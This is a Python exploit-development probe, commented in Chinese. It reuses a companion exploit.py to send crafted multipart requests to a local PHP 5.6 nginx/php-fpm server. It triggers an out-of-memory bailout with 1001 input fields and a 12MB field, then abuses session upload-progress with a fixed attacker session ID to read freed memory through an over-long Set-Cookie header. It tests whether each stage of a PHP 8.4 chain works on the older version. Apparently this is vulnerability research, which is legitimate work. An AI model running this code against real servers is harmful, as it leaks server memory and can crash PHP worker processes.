#!/usr/bin/env python3
"""php56 probe: 在 PHP 5.6.40 + nginx + fpm(单child) 上复现 8.4 链的前置原语。

复用 exploit.py 的 Target 传输层（边发边读），探针分三步：
  probe1  B-only      session/upload_progress 在 5.6 是否生效（Set-Cookie 是否出现）
  probe2  A+B         A 的 OOM bailout 后 B 能否带出超长 Set-Cookie（悬空 PS(id) 越界读）
                      —— 8.4 链 stage1 的直接对应物；5.6 中 PS(id) 是 char*，
                         cookie 经 strlen+php_url_encode 读到 NUL 为止
  probe3  A+B(带Cookie头)  A 后带合法 Cookie: PHPSESSID 复用 stale id 的行为
"""

from __future__ import annotations

import sys
import os
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from exploit import Target, build_multipart  # noqa: E402

URL = os.environ.get("P56_URL", "http://127.0.0.1:8089/index.php")
SID = b"attacksessionid0001"
B_BIG = "B" * (12 * 1024 * 1024)


def a_oom_parts(sid_data: bytes = b"\x00") -> list:
    """A 请求：1001 字段触发 max_input_vars 警告 + 12MB 字段 OOM。"""
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": sid_data},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": B_BIG.encode("latin1")},
    ]
    return parts


def b_session_parts(extra: list | None = None) -> list:
    """B 请求：仅初始化 session（带固定 SID），可附加字段。"""
    parts = [
        {"name": "PHPSESSID", "data": SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    if extra:
        parts += extra
    return parts


def head_of(resp: bytes, n: int = 1200) -> str:
    head, _, _ = resp.partition(b"\r\n\r\n")
    return head.decode("latin1", "replace")[:n]


def main() -> int:
    t = Target(URL, timeout=60.0, verbose=False)

    # ---- probe1: 纯 session B 请求（无 A） ----
    print("=" * 60)
    print("[probe1] B-only: does session.upload_progress work on 5.6?")
    resp = t.post(build_multipart(b_session_parts(), b"BNDRY12345"), b"BNDRY12345")
    print(head_of(resp))
    has_cookie = b"Set-Cookie: PHPSESSID" in resp
    print(f"[probe1] Set-Cookie present: {has_cookie}")

    # ---- probe2: A(OOM) + B(重占悬空 PS(id)) ----
    print("=" * 60)
    print("[probe2] A(OOM) + B: stale PS(id) over-read via Set-Cookie?")
    t.post(build_multipart(a_oom_parts(), b"S" * 17), b"S" * 17,
           read_cap=1 << 20, timeout=90.0)
    time.sleep(0.5)
    resp = t.post(build_multipart(b_session_parts(), b"BNDRY12345"), b"BNDRY12345")
    print(head_of(resp))
    import re
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*)", resp)
    if m:
        raw = m.group(1)
        print(f"[probe2] cookie value: {len(raw)} bytes: {raw[:80]!r}")
    else:
        print("[probe2] NO Set-Cookie in B response")

    # ---- probe3: A 后带合法 Cookie 复用 stale id ----
    print("=" * 60)
    print("[probe3] A(OOM) then B with Cookie header reusing stale id")
    t.post(build_multipart(a_oom_parts(b"a" * 19), b"S" * 17), b"S" * 17,
           read_cap=1 << 20, timeout=90.0)
    time.sleep(0.5)
    resp = t.post(build_multipart(b_session_parts(), b"BNDRY12345"), b"BNDRY12345",
                  extra_headers={"Cookie": "PHPSESSID=" + "a" * 32})
    print(head_of(resp))
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*)", resp)
    if m:
        print(f"[probe3] cookie value: {len(m.group(1))} bytes")
    else:
        print("[probe3] NO Set-Cookie (stale id reused, send_cookie=0)")

    # ---- 环境状态 ----
    print("=" * 60)
    print("[state] fpm child still alive? send one more request")
    try:
        resp = t.post(build_multipart(b_session_parts(), b"BNDRY12345"), b"BNDRY12345")
        print(head_of(resp, 300))
    except Exception as e:
        print(f"[state] request failed: {e}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
